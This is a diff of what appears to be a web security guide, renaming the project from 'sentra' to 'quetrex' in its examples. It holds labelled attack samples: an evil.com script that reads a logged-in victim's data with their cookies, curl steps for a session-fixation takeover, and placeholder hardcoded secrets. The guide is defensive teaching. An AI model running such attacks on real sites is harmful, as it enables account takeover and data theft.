@@ -305,7 +305,7 @@ const JWT_SECRET = 'mysupersecretkey123'
 
 // ❌ Committed .env file
 // .env (in git repository)
-DATABASE_URL="postgresql://admin:P@ssw0rd123@prod-db.example.com:5432/sentra"
+DATABASE_URL="postgresql://admin:P@ssw0rd123@prod-db.example.com:5432/quetrex"
 OPENAI_API_KEY="sk-proj-abc123def456ghi789"
 
 // ❌ Secrets in client code
@@ -362,7 +362,7 @@ export async function POST(request: Request) {
 
 // ✅ Example .env.example (template, no real values)
 // .env.example
-DATABASE_URL="postgresql://user:password@localhost:5432/sentra"
+DATABASE_URL="postgresql://user:password@localhost:5432/quetrex"
 OPENAI_API_KEY="sk-proj-YOUR_KEY_HERE"
 STRIPE_SECRET_KEY="sk_test_YOUR_KEY_HERE"
 JWT_SECRET="generate-random-string-here"
@@ -1017,8 +1017,8 @@ export function middleware(request: NextRequest) {
 ```html
 <!-- Attacker's website: evil.com -->
 <script>
-// Victim visits evil.com while logged into app.sentra.com
-fetch('https://app.sentra.com/api/user/data', {
+// Victim visits evil.com while logged into app.quetrex.com
+fetch('https://app.quetrex.com/api/user/data', {
   credentials: 'include'  // Includes victim's cookies
 })
 .then(r => r.json())
@@ -1036,8 +1036,8 @@ fetch('https://app.sentra.com/api/user/data', {
 ```typescript
 // ✅ Whitelist specific origins
 const ALLOWED_ORIGINS = [
-  'https://app.sentra.com',
-  'https://staging.sentra.com',
+  'https://app.quetrex.com',
+  'https://staging.quetrex.com',
   process.env.NODE_ENV === 'development' ? 'http://localhost:3000' : null,
 ].filter(Boolean) as string[]
 
@@ -1317,8 +1317,8 @@ import QRCode from 'qrcode'
 export async function enableMFA(userId: string) {
   // Generate secret
   const secret = speakeasy.generateSecret({
-    name: 'Sentra',
-    issuer: 'Sentra AI',
+    name: 'Quetrex',
+    issuer: 'Quetrex AI',
   })
 
   // Store secret
@@ -1421,16 +1421,16 @@ export async function login(request: Request, email: string, password: string) {
 **Attack:**
 ```bash
 # 1. Attacker gets session ID
-curl https://app.sentra.com/login
+curl https://app.quetrex.com/login
 # Set-Cookie: sessionId=abc123
 
 # 2. Attacker tricks victim to use this session ID
-# Send link: https://app.sentra.com/login?sessionId=abc123
+# Send link: https://app.quetrex.com/login?sessionId=abc123
 
 # 3. Victim logs in with sessionId=abc123
 
 # 4. Attacker uses sessionId=abc123 (now authenticated as victim!)
-curl -b "sessionId=abc123" https://app.sentra.com/api/user/data
+curl -b "sessionId=abc123" https://app.quetrex.com/api/user/data
 ```
 
 **Secure Code:**
@@ -1937,7 +1937,7 @@ export async function POST(request: Request) {
       signal: controller.signal,
       redirect: 'manual',  // Don't follow redirects
       headers: {
-        'User-Agent': 'Sentra/1.0',
+        'User-Agent': 'Quetrex/1.0',
       },
     })
 
